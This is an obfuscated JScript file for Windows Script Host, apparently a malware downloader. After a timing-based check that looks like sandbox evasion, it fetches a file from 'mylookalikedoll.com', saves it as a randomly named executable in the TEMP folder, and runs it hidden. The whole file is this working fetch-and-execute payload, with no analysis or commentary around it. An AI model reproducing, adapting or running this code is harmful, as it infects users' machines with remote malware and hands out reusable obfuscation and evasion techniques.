var _V = false;
var _WH = "CreateObject";
var _SY = function _HT() {return WScript[_WH]("WScript"+".Shell");}(), _Z = 11;
var _L = "MSXML2.XMLHTTP";
var _H = 2123213;
var _CU = 0;
function _UJ(_KH){_SY["Run"](_KH, _CU, _CU);};
function _U(){return _L + "";};
function _X(_L0, _G0){_CU = _CU * 1; return _L0 - _G0;};
function _KP(){return _WH;};
/*@cc_on
  @if (@_win32 || @_win64)
    _V = true;
  @end
@*/
if (_V)
{
var _ZC = "";
function _BB(){return 22;};
var _P0 = 0; var _CD = 0;
function _J()
{
var _KI = new this["Date"]();
var _A = _KI["getUTCMilliseconds"]();
WScript["Sleep"](_BB());
var _KI = new this["Date"]();
var _LK = _KI["getUTCMilliseconds"]();
WScript["Sleep"](_BB());
var _KI = new this["Date"]();
var _R = _KI["getUTCMilliseconds"]();
var _P0 = "_NR";
_P0 = _X(_LK, _A);
var _CD = "_O";
_CD = _X(_R, _LK);
_ZC = "open";
return _X(_P0, _CD);
}
var _I = false;
var _F = false;
for (var _Q = _CU; _Q < _BB() * 1; _Q++){if (_J() != _CU){
_I = true; 
_CD = "31" + 11 * _P0 + _CD; 
_F = true; 
break;
}}
function _N() {return ((_I == true) && (_I == _F)) ? 1 : _CU;};
if (_I && _N() && _F){
function _DC() {return _SY["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "uWCgDRuCmUP0zl.ex" + "e";};
 _SC = _U();
 _MT = WScript[_WH](_SC);
 var _OL = 1;
 while (_OL){
try {
	if (_OL == 1)
	{
		_MT[_ZC]("GET", "http://mylookalikedoll.com/n2iks", false);
		_MT["send"]();
		_A0 = "Sleep";
	}
	WScript[_A0](_BB() + 120); 
	if (_MT["readystate"] < 2 * 2) continue;
	_OL = _CU;
	function _P(_TT) {var _G = (1, 2, 3, 4, 5, _TT); return _G;};
	_PF = WScript[_KP()]("ADODB.Stream");
	_SC = _PF;
	_SC[_ZC]();
	_SC["type"] = _P(1);
	_SC["write"](_MT["ResponseBody"]);
	_PF["position"] = _P(_CU);
	_SC["Save" + "ToFile"](_DC(), 2);
	_PF["cl"+"ose"]();
	_M = _DC();
	_UJ(_M);
} catch(_SM){};
}
}
}

